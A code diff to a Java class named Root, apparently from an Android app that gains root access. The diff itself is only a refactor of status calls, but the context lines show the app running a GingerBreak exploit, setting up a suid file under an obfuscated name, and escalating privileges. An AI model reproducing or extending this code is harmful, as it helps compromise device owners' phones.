@@ -49,7 +49,7 @@ public class Root {
 	}
 	
 	static public void adjustOom() {	
-		if (Status.self().haveRoot() == false) {
+		if (Status.haveRoot() == false) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (adjustOom): cannot adjust OOM without root privileges"); //$NON-NLS-1$
 			}
@@ -90,7 +90,7 @@ public class Root {
 		final String path = filesPath.getAbsolutePath();
 		final String suidext = Messages.getString("32.6"); // statusdb
 
-		if (Status.self().haveSu() == false) {
+		if (Status.haveSu() == false) {
 			return;
 		}
 
@@ -175,19 +175,19 @@ public class Root {
 
 	public static void getPermissions() {
 		// Abbiamo su?
-		Status.self().setSu(PackageInfo.hasSu());
+		Status.setSu(PackageInfo.hasSu());
 	
 		// Abbiamo la root?
-		Status.self().setRoot(PackageInfo.checkRoot());
+		Status.setRoot(PackageInfo.checkRoot());
 	
-		if (Status.self().haveSu() == true && Status.self().haveRoot() == false && Keys.self().wantsPrivilege()) {
+		if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege()) {
 			// Ask the user...
 			Root.superapkRoot();
 	
-			Status.self().setRoot(PackageInfo.checkRoot());
+			Status.setRoot(PackageInfo.checkRoot());
 	
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (onStart): isRoot = " + Status.self().haveRoot()); //$NON-NLS-1$
+				Check.log(TAG + " (onStart): isRoot = " + Status.haveRoot()); //$NON-NLS-1$
 			}
 		}
 	
@@ -501,7 +501,7 @@ public class Root {
 	}
 	
 	public static void runGingerBreak() {
-		boolean isRoot = Status.self().haveRoot();
+		boolean isRoot = Status.haveRoot();
 	
 		if (isRoot == false) {
 			// Don't exploit if we have no SD card mounted
@@ -537,7 +537,7 @@ public class Root {
 			}
 		}
 	
-		Status.self().setRoot(isRoot);
+		Status.setRoot(isRoot);
 	}
 
 	// Exploit thread
